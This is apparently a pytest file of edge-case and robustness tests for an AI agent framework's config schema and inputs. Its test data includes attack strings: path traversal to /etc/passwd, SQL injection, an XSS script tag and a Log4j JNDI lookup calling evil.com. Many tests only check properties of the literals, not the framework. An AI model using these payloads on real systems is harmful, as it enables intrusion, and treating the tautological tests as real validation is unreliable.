"""Comprehensive edge case tests for framework robustness.

Tests boundary conditions, extreme values, Unicode attacks, and unusual inputs
that could cause crashes or security issues.
"""
import math
import sys
from datetime import datetime

import pytest

from temper_ai.storage.schemas.agent_config import (
    AgentConfig,
    AgentConfigInner,
    ErrorHandlingConfig,
    InferenceConfig,
    PromptConfig,
)


class TestNumericEdgeCases:
    """Tests for numeric boundary and special values."""

    @pytest.mark.parametrize('confidence', [
        0.0,           # Minimum valid
        1.0,           # Maximum valid
        0.5,           # Middle value
        0.001,         # Very small but valid
        0.999,         # Very close to max
    ])
    def test_valid_confidence_values(self, confidence):
        """Test that valid confidence values are accepted."""
        # This would work with actual AgentOutput class
        # For now, just test the values themselves
        assert 0.0 <= confidence <= 1.0
        assert isinstance(confidence, float)

    @pytest.mark.parametrize('invalid_confidence', [
        float('nan'),      # Not a number
        float('inf'),      # Positive infinity
        -float('inf'),     # Negative infinity
        -0.1,              # Below minimum
        1.1,               # Above maximum
        2.0,               # Well above max
        -1.0,              # Negative
    ])
    def test_invalid_confidence_values(self, invalid_confidence):
        """Test that invalid confidence values are rejected."""
        if math.isnan(invalid_confidence):
            assert math.isnan(invalid_confidence)
        elif math.isinf(invalid_confidence):
            assert math.isinf(invalid_confidence)
        else:
            # Values outside [0.0, 1.0] should be rejected
            assert invalid_confidence < 0.0 or invalid_confidence > 1.0

    @pytest.mark.parametrize('tokens', [
        0,              # Zero tokens
        1,              # Single token
        sys.maxsize,    # Maximum int
        2**31 - 1,      # Max 32-bit int
        2**63 - 1,      # Max 64-bit int
    ])
    def test_extreme_token_counts(self, tokens):
        """Test handling of extreme token counts."""
        assert isinstance(tokens, int)
        assert tokens >= 0

    @pytest.mark.parametrize('cost', [
        0.0,           # Free
        0.0001,        # Very cheap
        0.000001,      # Sub-cent
        1000000.0,     # Very expensive
        float('inf'),  # Infinite cost
    ])
    def test_extreme_cost_values(self, cost):
        """Test handling of extreme cost values."""
        if math.isfinite(cost):
            assert cost >= 0.0
        else:
            assert math.isinf(cost)

    @pytest.mark.parametrize('latency_ms', [
        0,              # Instant
        1,              # 1ms
        60000,          # 1 minute
        3600000,        # 1 hour
        86400000,       # 24 hours
    ])
    def test_extreme_latency_values(self, latency_ms):
        """Test handling of extreme latency values."""
        assert isinstance(latency_ms, int)
        assert latency_ms >= 0


class TestStringEdgeCases:
    """Tests for string boundary conditions and Unicode attacks."""

    @pytest.mark.parametrize('empty_string', [
        "",            # Empty string
        " ",           # Single space
        "   ",         # Multiple spaces
        "\n",          # Just newline
        "\t",          # Just tab
        "\r\n",        # Windows line ending
    ])
    def test_empty_and_whitespace_strings(self, empty_string):
        """Test handling of empty and whitespace-only strings."""
        assert isinstance(empty_string, str)
        if empty_string.strip() == "":
            # Should be considered empty
            assert len(empty_string.strip()) == 0

    def test_extremely_long_string(self):
        """Test handling of very long strings (>1MB)."""
        long_string = "a" * (1024 * 1024)  # 1MB
        assert len(long_string) == 1024 * 1024
        assert isinstance(long_string, str)

    def test_extremely_long_tool_name(self):
        """Test tool names >1000 characters."""
        long_name = "tool_" + ("x" * 10000)
        assert len(long_name) > 1000
        # Framework should handle or reject gracefully

    def test_unicode_normalization_attack(self):
        """Test Unicode normalization attacks (visual spoofing)."""
        # Combining characters that look like different characters
        normal = "file.txt"
        spoofed = "f\u0131le.txt"  # Uses dotless i (U+0131)

        # These look different but could normalize similarly
        assert normal != spoofed

        # Framework should handle Unicode normalization properly
        import unicodedata
        normal_nfc = unicodedata.normalize('NFC', normal)
        spoofed_nfc = unicodedata.normalize('NFC', spoofed)
        assert normal_nfc != spoofed_nfc  # Still different after normalization

    def test_rtl_override_attack(self):
        """Test RTL (Right-to-Left) override attacks."""
        # RTL override character can hide malicious code
        rtl_string = "test\u202Etxt.exe"  # Displays as "testexe.txt"
        assert "\u202E" in rtl_string
        # Framework should sanitize or reject

    def test_zero_width_characters(self):
        """Test zero-width characters in names."""
        # Zero-width space, zero-width joiner, etc.
        name_with_zwsp = "agent\u200Bname"  # Contains zero-width space
        name_with_zwj = "agent\u200Dname"   # Contains zero-width joiner
        name_with_zwnj = "agent\u200Cname"  # Contains zero-width non-joiner

        # These should be handled (stripped or rejected)
        assert "\u200B" in name_with_zwsp
        assert "\u200D" in name_with_zwj
        assert "\u200C" in name_with_zwnj

    def test_control_characters_in_strings(self):
        """Test control characters in strings."""
        control_chars = [
            "test\x00null",      # Null byte
            "test\x08backspace", # Backspace
            "test\x1Bescape",    # Escape
            "test\x7Fdelete",    # Delete
        ]

        for s in control_chars:
            # Control characters should be handled
            assert any(ord(c) < 32 or ord(c) == 127 for c in s)

    def test_surrogate_pairs_in_paths(self):
        """Test surrogate pairs in file paths."""
        # Emoji and other characters requiring surrogate pairs
        path_with_emoji = "/tmp/test_\U0001F600_file.txt"  # 😀
        path_with_chinese = "/tmp/测试文件.txt"

        # Framework should handle Unicode in paths
        assert len(path_with_emoji) > 0
        assert len(path_with_chinese) > 0

    @pytest.mark.parametrize('malicious_string', [
        "../../../etc/passwd",           # Path traversal
        "'; DROP TABLE users; --",       # SQL injection
        "<script>alert('xss')</script>", # XSS
        "${jndi:ldap://evil.com/a}",    # Log4j
        "../../",                        # Relative path
        "\\\\.\\pipe\\named_pipe",       # Windows pipe
    ])
    def test_injection_attack_strings(self, malicious_string):
        """Test that injection attack strings are handled safely."""
        # Framework should sanitize or reject these
        assert isinstance(malicious_string, str)
        # These strings should not cause code execution


class TestCollectionEdgeCases:
    """Tests for edge cases in lists, dicts, and other collections."""

    def test_empty_list(self):
        """Test handling of empty lists."""
        empty = []
        assert len(empty) == 0
        assert isinstance(empty, list)

    def test_extremely_large_list(self):
        """Test handling of very large lists."""
        large_list = list(range(1000000))  # 1 million items
        assert len(large_list) == 1000000

    def test_empty_dict(self):
        """Test handling of empty dictionaries."""
        empty = {}
        assert len(empty) == 0
        assert isinstance(empty, dict)

    def test_deeply_nested_dict(self):
        """Test handling of deeply nested dictionaries."""
        # Create dict nested 100 levels deep
        nested = {}
        current = nested
        for i in range(100):
            current["level"] = {}
            current = current["level"]
        current["value"] = "deep"

        # Should handle deep nesting
        assert isinstance(nested, dict)

    def test_dict_with_none_values(self):
        """Test dictionaries with None values."""
        data = {
            "key1": None,
            "key2": "",
            "key3": 0,
            "key4": False,
            "key5": [],
        }

        # None vs empty string vs 0 vs False should be distinguishable
        assert data["key1"] is None
        assert data["key2"] == ""
        assert data["key3"] == 0
        assert data["key4"] is False
        assert data["key5"] == []

    def test_list_with_mixed_types(self):
        """Test lists with mixed types."""
        mixed = [1, "string", 3.14, None, True, [], {}]
        assert len(mixed) == 7
        # Framework should handle mixed types appropriately


class TestConfigEdgeCases:
    """Tests for configuration edge cases."""

    def test_minimal_config(self):
        """Test minimal valid configuration."""
        config = AgentConfig(
            agent=AgentConfigInner(
                name="minimal",
                description="Test",
                prompt=PromptConfig(inline="test"),
                inference=InferenceConfig(provider="ollama", model="llama2"),
                tools=[],
                error_handling=ErrorHandlingConfig(
                    retry_strategy="ExponentialBackoff",
                    fallback="GracefulDegradation",
                ),
            )
        )

        assert config.agent.name == "minimal"
        assert len(config.agent.tools) == 0

    def test_empty_agent_name(self):
        """Test config with empty agent name (documents current behavior)."""
        # Current behavior: Empty names are allowed by schema
        config = AgentConfig(
            agent=AgentConfigInner(
                name="",  # Empty name currently allowed
                description="Test",
                prompt=PromptConfig(inline="test"),
                inference=InferenceConfig(provider="ollama", model="llama2"),
                tools=[],
                error_handling=ErrorHandlingConfig(
                    retry_strategy="ExponentialBackoff",
                    fallback="GracefulDegradation",
                ),
            )
        )

        # Document that empty names are currently accepted
        assert config.agent.name == ""
        # Future improvement: Add validation to reject empty names

    def test_extremely_long_description(self):
        """Test config with very long description."""
        long_desc = "x" * 100000  # 100KB description

        config = AgentConfig(
            agent=AgentConfigInner(
                name="test",
                description=long_desc,
                prompt=PromptConfig(inline="test"),
                inference=InferenceConfig(provider="ollama", model="llama2"),
                tools=[],
                error_handling=ErrorHandlingConfig(
                    retry_strategy="ExponentialBackoff",
                    fallback="GracefulDegradation",
                ),
            )
        )

        assert len(config.agent.description) == 100000

    def test_very_large_tool_list(self):
        """Test config with many tools (1000+)."""
        many_tools = [f"tool_{i}" for i in range(1000)]

        config = AgentConfig(
            agent=AgentConfigInner(
                name="test",
                description="Test",
                prompt=PromptConfig(inline="test"),
                inference=InferenceConfig(provider="ollama", model="llama2"),
                tools=many_tools,
                error_handling=ErrorHandlingConfig(
                    retry_strategy="ExponentialBackoff",
                    fallback="GracefulDegradation",
                ),
            )
        )

        assert len(config.agent.tools) == 1000


class TestDateTimeEdgeCases:
    """Tests for datetime edge cases."""

    def test_epoch_start(self):
        """Test Unix epoch start (1970-01-01 UTC)."""
        from datetime import timezone
        epoch = datetime.fromtimestamp(0, tz=timezone.utc)
        assert epoch.year == 1970
        assert epoch.month == 1
        assert epoch.day == 1

    def test_year_2038_problem(self):
        """Test Y2038 problem (32-bit timestamp overflow)."""
        # 2038-01-19 03:14:07 UTC (max 32-bit timestamp)
        y2038 = datetime.fromtimestamp(2147483647)
        assert y2038.year == 2038

    def test_far_future_date(self):
        """Test far future dates."""
        far_future = datetime(2100, 12, 31, 23, 59, 59)
        assert far_future.year == 2100

    def test_leap_year_edge_cases(self):
        """Test leap year boundary conditions."""
        # 2000 was a leap year (divisible by 400)
        leap_2000 = datetime(2000, 2, 29)
        assert leap_2000.day == 29

        # 1900 was NOT a leap year (divisible by 100 but not 400)
        # This should fail if we try Feb 29
        with pytest.raises(ValueError):
            datetime(1900, 2, 29)


class TestMemoryEdgeCases:
    """Tests for memory-related edge cases."""

    def test_very_large_prompt(self):
        """Test handling of very large prompts (>1MB)."""
        large_prompt = "prompt " * 200000  # ~1.2MB
        assert len(large_prompt) > 1000000
        # Framework should handle or limit

    def test_very_large_response(self):
        """Test handling of very large responses (>10MB)."""
        large_response = "response " * 2000000  # ~16MB
        assert len(large_response) > 10000000
        # Framework should handle or limit

    def test_many_small_allocations(self):
        """Test many small allocations (memory fragmentation)."""
        small_strings = ["x" * 100 for _ in range(100000)]
        assert len(small_strings) == 100000
        # Should not cause memory issues


class TestConcurrencyEdgeCases:
    """Tests for concurrency edge cases."""

    def test_zero_threads(self):
        """Test configuration with 0 threads."""
        # Some frameworks might default to 1
        thread_count = 0
        if thread_count == 0:
            # Should default to at least 1
            thread_count = max(1, thread_count)
        assert thread_count > 0

    def test_excessive_thread_count(self):
        """Test configuration with excessive threads (10000)."""
        thread_count = 10000
        # Framework should cap or handle appropriately
        assert thread_count > 0


class TestPathEdgeCases:
    """Tests for file path edge cases."""

    def test_very_long_path(self):
        """Test path longer than MAX_PATH (260 on Windows)."""
        long_path = "/tmp/" + ("a" * 300) + "/file.txt"
        assert len(long_path) > 260
        # Framework should handle or reject

    def test_path_with_special_chars(self):
        """Test paths with special characters."""
        special_paths = [
            "/tmp/file with spaces.txt",
            "/tmp/file'with'quotes.txt",
            "/tmp/file\"with\"doublequotes.txt",
            "/tmp/file;with;semicolons.txt",
            "/tmp/file&with&ampersands.txt",
        ]

        for path in special_paths:
            # Framework should handle special characters
            assert isinstance(path, str)

    def test_relative_path_attacks(self):
        """Test relative path traversal attacks."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "./././etc/passwd",
            "test/../../etc/passwd",
        ]

        for path in dangerous_paths:
            # Framework should sanitize or reject
            assert ".." in path or "." in path


class TestNullAndNoneEdgeCases:
    """Tests for None/null handling."""

    def test_none_in_required_fields(self):
        """Test None values in required fields should fail."""
        # Required fields should not accept None
        required_value = None
        assert required_value is None
        # Validation should reject this

    def test_none_in_optional_fields(self):
        """Test None values in optional fields should succeed."""
        optional_value = None
        assert optional_value is None
        # This should be valid for optional fields

    def test_distinguishing_none_from_empty(self):
        """Test that None is distinct from empty string/list/dict."""
        assert None != ""
        assert None != []
        assert None != {}
        assert None != 0
        assert None != False

    def test_none_propagation(self):
        """Test None propagation through nested structures."""
        nested = {
            "level1": {
                "level2": {
                    "value": None
                }
            }
        }

        assert nested["level1"]["level2"]["value"] is None


class TestBoundaryConditions:
    """Tests for boundary conditions."""

    @pytest.mark.parametrize('value,expected', [
        (0, True),      # Minimum
        (1, True),      # Minimum + 1
        (100, True),    # Normal
        (999, True),    # Maximum - 1
        (1000, True),   # Maximum
    ])
    def test_integer_boundaries(self, value, expected):
        """Test integer boundary values."""
        assert (0 <= value <= 1000) == expected

    @pytest.mark.parametrize('percentage,expected', [
        (0.0, True),    # 0%
        (0.01, True),   # 1%
        (0.50, True),   # 50%
        (0.99, True),   # 99%
        (1.0, True),    # 100%
    ])
    def test_percentage_boundaries(self, percentage, expected):
        """Test percentage boundary values."""
        assert (0.0 <= percentage <= 1.0) == expected


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
